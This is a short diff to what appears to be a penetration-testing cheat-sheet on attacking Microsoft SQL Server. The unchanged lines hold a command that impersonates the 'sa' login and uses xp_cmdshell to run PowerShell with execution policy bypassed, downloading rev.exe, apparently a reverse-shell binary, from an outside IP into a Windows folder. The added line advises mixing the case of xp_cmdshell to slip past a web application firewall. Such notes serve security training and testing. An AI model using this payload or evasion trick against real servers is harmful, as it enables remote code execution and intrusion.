@@ -66,6 +66,8 @@ execute as login = 'sa'; reconfigure;
 execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe'
 ```
 
+<small>*Note: try xp_cmDshElL to bypass WAF*</small>
+
 #### Run External Script
 
 ```mysql
